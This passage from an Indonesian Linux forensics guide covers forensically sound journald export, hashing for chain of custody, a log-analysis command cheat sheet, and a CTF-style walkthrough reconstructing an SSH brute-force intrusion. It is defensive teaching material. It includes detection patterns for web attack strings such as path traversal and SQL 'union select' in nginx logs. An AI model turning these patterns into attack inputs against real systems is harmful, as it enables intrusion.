# ===== 3. Ekspor journald secara FORENSIK-AMAN — jangan sekadar copy file .journal
#          yang mungkin masih being-written (risiko korup); gunakan export resmi =====

# Opsi A — copy file .journal mentah (utuh dengan semua metadata biner),
# journald otomatis rotate file aktif jadi file baru saat proses ini aman dilakukan:
sudo cp -a /var/log/journal/<machine-id>/ /mnt/evidence/logs/journal_raw/

# Opsi B — export ke format teks portable yang menyertakan SEMUA field metadata
# (lebih mudah diproses lintas platform / dilampirkan sebagai bukti dokumen)
journalctl --output=export > /mnt/evidence/logs/journal_export.bin
journalctl -o json > /mnt/evidence/logs/journal_export.json

# Opsi C — kalau cuma butuh rentang waktu tertentu (insiden spesifik), persempit dulu
journalctl --since "2026-08-14 08:00:00" --until "2026-08-14 12:00:00" \
  -o export > /mnt/evidence/logs/journal_incident_window.bin

# ===== 4. Hash hasil akuisisi — bukti chain of custody =====
sha256sum -r /mnt/evidence/logs/ > /mnt/evidence/logs_hashes_after.sha256
# (opsional) bundling jadi satu arsip dengan timestamp preserve
sudo tar --preserve-permissions -czf /mnt/evidence/logs_$(date -u +%Y%m%dT%H%M%SZ).tar.gz \
  -C /mnt/evidence logs/
sha256sum /mnt/evidence/logs_*.tar.gz >> /mnt/evidence/logs_hashes_after.sha256
```

> ⚠️ **Jangan `--vacuum` atau restart service logging sebelum akuisisi selesai:** Tindakan yang tampak "aman" seperti restart `rsyslog`/`systemd-journald` untuk "membebaskan file lock" bisa memicu rotasi internal yang mengubah state journal aktif. Selalu **copy dulu, baru** (kalau memang perlu) lakukan tindakan apapun terhadap service logging yang masih berjalan.

> 📌 **Kenapa export journald lebih disarankan dibanding copy mentah saja:** Format `--output=export` menyertakan **seluruh field trusted** (§3.4.6) dalam bentuk yang bisa diverifikasi ulang dan diimpor balik ke `journalctl` di mesin analis (`journalctl --file=journal_export.bin`), tanpa bergantung pada versi systemd/library yang sama persis dengan sistem asal — berguna kalau akuisisi dilakukan dari sistem yang mungkin sudah dikuasai attacker dan tool `cp` bawaan sistem tidak sepenuhnya dipercaya.

> 🔗 **Selaras dengan Lampiran Bab 1:** Prinsip *read-only, hash sebelum-sesudah, chain of custody* di sini mengikuti alur generik yang sama dengan **Lampiran Bab 1 — Master Acquisition & Export Workflow (Linux)**; bagian ini adalah versi khusus untuk artefak log, dilakukan idealnya **sebelum** proses shutdown/imaging disk penuh, karena sebagian log (journal volatile, §3.4.2) hilang permanen begitu sistem reboot/shutdown.

---

### 3.12 Ringkasan Command & Tools Cheat Sheet

```bash
# ===== TIMEZONE & TIMESTAMP NORMALIZATION (LAKUKAN DI AWAL) =====
timedatectl status
readlink -f /etc/localtime
journalctl --utc
date -u -d @<epoch>
chronyc tracking 2>/dev/null || ntpq -p 2>/dev/null

# ===== SYSLOG KLASIK — LOKASI & CONFIG =====
ls -la /var/log/
cat /etc/rsyslog.conf
cat /etc/rsyslog.d/*.conf
cat /etc/logrotate.d/rsyslog

# ===== SYSLOG KLASIK — READ & ROTASI =====
zcat /var/log/auth.log.2.gz | less
zgrep "Failed password" /var/log/auth.log*.gz
for f in /var/log/auth.log.*.gz; do zcat "$f"; done > /tmp/auth_all.log

# ===== AUTH / SUDO / SSH =====
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
grep -E "Accepted (password|publickey)" /var/log/auth.log
grep "sudo:" /var/log/auth.log | grep "COMMAND="
grep -E "useradd|usermod|groupadd|userdel" /var/log/auth.log

# ===== REMOTE / CENTRALIZED LOGGING =====
grep -E "^\*\.\*.*@|^\S+\.\S+.*@" /etc/rsyslog.conf /etc/rsyslog.d/*.conf
grep -E "^ForwardToSyslog" /etc/systemd/journald.conf
systemctl status systemd-journal-upload 2>/dev/null

# ===== JOURNALD — DASAR =====
journalctl -r
journalctl --since "2026-08-14 08:00:00" --until "2026-08-14 10:00:00"
journalctl -u sshd
journalctl -b -1
journalctl -p err
journalctl -f
journalctl -k

# ===== JOURNALD — FILTER FIELD LANJUTAN =====
journalctl _PID=<pid>
journalctl _COMM=sshd
journalctl _UID=<uid>
journalctl _EXE=/path/to/binary
journalctl -o json-pretty -u sshd --since today
journalctl -o verbose -n 5

# ===== JOURNALD — METADATA FIELD & BOOT CORRELATION =====
journalctl -o verbose -n 1 -u sshd
journalctl -u sshd -o json | jq -r '[.["__REALTIME_TIMESTAMP"], ._PID, ._COMM, ._EXE, .MESSAGE] | @tsv'
journalctl --list-boots
journalctl -b -1
journalctl _BOOT_ID=<boot-id-hex>
cat /proc/sys/kernel/random/boot_id
last reboot

# ===== JOURNALD — INTEGRITAS & MAINTENANCE =====
journalctl --disk-usage
journalctl --verify
journalctl --file=/var/log/journal/<machine-id>/system.journal~
cat /etc/systemd/journald.conf

# ===== LOG PRESERVATION / ACQUISITION =====
sha256sum /var/log/auth.log /var/log/syslog > /tmp/log_hashes_before.txt
sudo cp -a /var/log/auth.log* /var/log/syslog* /mnt/evidence/logs/
sudo cp -a /var/log/journal/<machine-id>/ /mnt/evidence/logs/journal_raw/
journalctl --output=export > /mnt/evidence/logs/journal_export.bin
journalctl --since "<start>" --until "<end>" -o export > /mnt/evidence/logs/journal_incident.bin
sha256sum -r /mnt/evidence/logs/ > /mnt/evidence/logs_hashes_after.sha256

# ===== AUDITD (COMPLEMENTARY — CEK STATUS DULU SEBELUM ANDALKAN) =====
sudo auditctl -l
cat /etc/audit/rules.d/audit.rules
sudo ausearch -ua <uid>
sudo ausearch -ts today -te now
sudo ausearch -m EXECVE
sudo ausearch -m CONFIG_CHANGE
sudo aureport --summary
sudo aureport -x --summary

# ===== APLIKASI LAIN =====
grep CRON /var/log/syslog
cat /var/log/dpkg.log | grep " install "
sudo rpm -qa --last
grep -E "\.php\?|\.\./|union.*select" /var/log/nginx/access.log

# ===== ANTI-TAMPER CHECK =====
stat /var/log/auth.log
ls -la /var/log/auth.log*
sudo ausearch -m CONFIG_CHANGE
journalctl -u rsyslog -u systemd-journald --since "7 days ago"
```

---

### 3.13 Mini Case Study — Workflow Analisa End-to-End

Contoh alur berpikir kalau soal CTF/investigasi bilang: *"Server Ubuntu diserang lewat SSH brute force, attacker berhasil masuk, melakukan privilege escalation, menjalankan payload, lalu mencoba menghapus jejaknya — rekonstruksi kronologi lengkap dan buktikan usaha anti-forensics-nya."*

```
Langkah 0 — Normalisasi waktu & preservasi evidence sebelum apapun lain
   timedatectl status ; journalctl --utc                 # baseline timezone (§3.1.3)
   sha256sum /var/log/auth.log /var/log/syslog > /tmp/log_hashes_before.txt
   sudo cp -a /var/log/auth.log* /var/log/syslog* /mnt/evidence/logs/
   journalctl --output=export > /mnt/evidence/logs/journal_export.bin
   → semua timestamp berikutnya dianalisis dalam UTC, evidence sudah diamankan (§3.1.3, §3.11)

Langkah 1 — Cek arsitektur logging yang tersedia di sistem target, termasuk forwarding
   systemctl status rsyslog systemd-journald auditd
   grep "^Storage=" /etc/systemd/journald.conf
   grep -E "^\*\.\*.*@|^\S+\.\S+.*@" /etc/rsyslog.conf /etc/rsyslog.d/*.conf
   → tentukan sumber mana saja yang realistis punya data, dan apakah ada salinan
     di log server terpusat yang bisa dijadikan sumber otoritatif (§3.1, §3.2.6, §3.4.2)

Langkah 2 — Identifikasi brute force & login sukses di auth.log
   grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
   grep -E "Accepted (password|publickey)" /var/log/auth.log
   → catat IP sumber, username target, timestamp login sukses (§3.3.1)

Langkah 3 — Cross-check login sukses ke journald untuk metadata tambahan (PID, sesi PAM)
   journalctl _COMM=sshd --since "<timestamp login>" --until "<+5 menit>"
   journalctl --list-boots                                # pastikan boot yang sama (§3.4.7)
   → konfirmasi konsisten dengan auth.log, catat kalau ada gap mencurigakan (§3.4.5, §3.8)

Langkah 4 — Telusuri command sudo/privilege escalation setelah login
   grep "sudo:" /var/log/auth.log | grep "COMMAND=" 
   journalctl _COMM=sudo _UID=<uid> -o json | jq -r '.MESSAGE'
   → dapat command yang dijalankan sebagai root dari sumber wajib (§3.3.2, §3.4.6)

Langkah 4b — (Kalau auditd aktif) perkuat temuan Langkah 4 dengan command line presisi
   systemctl is-active auditd && sudo ausearch -m USER_CMD -m EXECVE --start "<timestamp login>"
   → auditd di sini MELENGKAPI Langkah 4, bukan menggantikannya — kalau tidak aktif,
     lanjut ke Langkah 5 memakai journald saja tanpa auditd (§3.5.1)

Langkah 5 — Rekonstruksi payload/command lewat journald _EXE/_CMDLINE (wajib tersedia),
             diperkuat EXECVE auditd kalau ada (opsional)
   journalctl _EXE=/tmp/* 2>/dev/null -o verbose
   sudo ausearch -m EXECVE -i | grep -A5 -B5 "<pid terkait>" 2>/dev/null
   → dapat full command line, path payload, argumen (§3.4.5, §3.4.6, §3.5.2)

Langkah 6 — Korelasi dengan artefak filesystem — cari file baru muncul waktu bersamaan
   fls -rd /dev/sda1 (atau partisi root) | grep -i tmp
   sudo debugfs -R "stat <inode>" /dev/sda1
   → crtime harus konsisten dengan timestamp Langkah 5, dalam basis UTC yang sama (Bab 2 §2.1.2)

Langkah 7 — Cari usaha penghapusan jejak
   stat /var/log/auth.log                              # cek mtime vs ukuran wajar
   ls -la /var/log/auth.log*                            # bandingkan pola rotasi normal
   sudo ausearch -m CONFIG_CHANGE 2>/dev/null            # rule audit diubah? (kalau auditd ada)
   journalctl -u rsyslog -u systemd-journald --since "<sekitar waktu insiden>"
   → cari gap logging, service restart tidak wajar, truncate file (§3.7.1, §3.7.2, §3.9)

Langkah 8 — Kalau file log dihapus total, cek kemungkinan recovery di level inode,
             atau tarik dari log server terpusat kalau forwarding aktif (Langkah 1)
   fls -rd /dev/sda1 | grep -i "auth.log"
   → kalau inode belum realloc, icat untuk recover isi log yang terhapus (Bab 2 §2.5.9);
     kalau ada salinan di server terpusat, itu jadi sumber utama pengganti (§3.2.6, §3.9)

Kesimpulan yang bisa ditulis di laporan:
"Seluruh waktu di bawah dinormalisasi ke UTC (§3.1.3). Attacker melakukan brute force SSH
dari IP X selama Y menit (N percobaan gagal tercatat di auth.log), berhasil login sebagai
user Z pada waktu T1. Privilege escalation ke root dilakukan via sudo pada T2 (command
tercatat di auth.log & journald, [diperkuat audit.log USER_CMD kalau tersedia]). Payload
dieksekusi pada T3, direkonstruksi dari journald _EXE/_CMDLINE [dan/atau EXECVE audit.log]
berupa [command]. File baru muncul di /tmp dengan crtime konsisten dengan T3 (korelasi
Bab 2). Attacker selanjutnya mencoba menghapus jejak dengan [teknik dari §3.7.1] pada T4,
terbukti dari [indikator spesifik dari §3.7.2] — namun sebagian jejak tetap terekonstruksi
lewat [sumber pelengkap yang selamat, termasuk log server terpusat bila ada]. Keterbatasan
evidence: [catat celah dari tabel Log Reliability §3.9 yang relevan, misal journal volatile
yang hilang sebelum sempat diakuisisi]."
```

> 💡 **Prinsip umum (konsisten dengan Bab 2 §2.13):** Jangan berhenti di satu sumber log. `auth.log` + journald (§3.2–§3.4) adalah **fondasi wajib** yang harus selalu dicek duluan; `auditd` (§3.5) memperkuat kalau kebetulan aktif, tapi investigasi tidak boleh berhenti hanya karena dia tidak ada. Artefak filesystem (Bab 2) kasih "konfirmasi independen lewat timestamp inode", dan log terpusat (§3.2.6) — kalau ada — jadi sumber paling tahan tampering. Ketika attacker berhasil menghapus satu sumber, kombinasi sumber lain yang tersisa biasanya masih cukup untuk merekonstruksi kronologi dengan tingkat keyakinan tinggi; kalau tidak, itu dicatat eksplisit sebagai evidence gap (§3.9), bukan diabaikan.

> 🔗 **Menuju Bab 4:** Setelah paham *kapan* dan *command apa* lewat log (Bab 3), Bab 4 masuk ke *struktur artefak user & auth itu sendiri* — `/etc/passwd`, `/etc/shadow`, sudoers, serta bash/zsh history dan SSH artifacts secara mendalam, melengkapi konteks yang baru disinggung sekilas di §3.3 dan §3.3.3.
